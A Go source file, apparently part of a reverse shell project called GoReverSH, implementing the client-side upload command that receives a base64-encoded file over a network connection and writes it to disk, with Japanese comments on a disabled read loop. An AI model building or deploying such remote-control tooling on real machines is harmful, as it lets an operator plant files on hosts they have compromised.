package pkgclient

import (
	"GoReverSH/config"
	"encoding/base64"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
)

func ExecUpload(fileName string, conn net.Conn) error {
	//filePath := strings.Split(commands[len(commands)-1], "/")
	//fileName := commands[len(commands)-1]
	filePath := strings.Split(fileName, "/")
	lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
	//dir := "upload/"
	dir := config.Config.UploadDIr
	if _, err := os.Stat(dir + lastPathFromRecievedFile); os.IsNotExist(err) {
		if err2 := os.MkdirAll(dir+lastPathFromRecievedFile, 0755); err2 != nil {
			log.Fatalf("Could not create the path %s", dir)
		}
	}

	/*
		//read
		//最終的な入れ物
		var content []byte
		//読み込むもの
		buf := make([]byte, 1024)
		//読み込む位置
		size := 0

		for {
			//ファイルを読み込む
			n, err := conn.Read(buf)
			if err != nil {
				if n == 0 || err == io.EOF {
					break
				}
				break
			}
			//content + bufの中身を一時的に保存。
			tmp := make([]byte, 0, size+n)
			tmp = append(content[:size], buf[:n]...)
			content = tmp
			size += n
			if n < 1024 {
				break
			}
		}
	*/

	content, err := RRead(conn)
	if err != nil {
		log.Println(err)
		return err
	}

	//save
	src := filepath.Join(dir, fileName)
	file, err := os.Create(src)
	if err != nil {
		log.Println(err)
		return err
	}
	base64ToData, err := base64.StdEncoding.DecodeString(string(content))
	_, err = file.Write(base64ToData)
	if err != nil {
		file.Close()
		return err
	}
	err = file.Close()
	if err != nil {
		return err
	}

	return nil
}
